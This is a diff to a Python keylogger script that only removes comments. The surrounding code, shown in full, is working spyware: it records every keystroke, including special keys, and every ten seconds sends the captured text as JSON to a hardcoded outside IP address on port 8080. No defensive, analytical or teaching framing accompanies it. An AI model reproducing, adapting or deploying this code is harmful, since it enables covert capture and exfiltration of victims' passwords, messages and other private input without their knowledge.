@@ -4,18 +4,16 @@ import requests
 import json
 import threading
 
-text = ""  # Store the captured keystrokes
-ip_address = "109.74.200.23"  # Server IP address
-port_number = "8080"  # Server port
-time_interval = 10  # Interval to send data to the server in seconds
+text = "" 
+ip_address = "109.74.200.23" 
+port_number = "8080" 
+time_interval = 10  
 
 def send_post_req():
-    global text  # Reference the global variable
-    if text.strip():  # Send data only if there's something to send
+    global text 
+    if text.strip():  
         try:
-            # Convert keystrokes to JSON format
             payload = json.dumps({"keyboardData": text})
-            # POST request to the server
             response = requests.post(
                 f"http://{ip_address}:{port_number}",
                 data=payload,
@@ -28,7 +26,6 @@ def send_post_req():
         except Exception as e:
             print(f"Error sending request: {e}")
         finally:
-            # Clear the text after sending
             text = ""
 
     # Restart the timer
@@ -50,9 +47,9 @@ def on_press(key):
         elif key == keyboard.Key.backspace:
             text = text[:-1] if text else text
         elif hasattr(key, 'char') and key.char is not None:
-            text += key.char  # Capture alphanumeric keys
+            text += key.char  
         else:
-            text += f"[{key.name}]"  # Capture special keys like shift, ctrl
+            text += f"[{key.name}]"  
     except Exception as e:
         print(f"Error processing key: {e}")
 
@@ -61,9 +58,9 @@ def start_keylogger():
     Starts the keylogger with a keyboard listener and periodic server communication.
     """
     print("Keylogger started... Press ESC to stop.")
-    send_post_req()  # Start sending data periodically
+    send_post_req()  
     with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()  # Keep the listener active
+        listener.join()
 
 if _name_ == "_main_":
     start_keylogger()
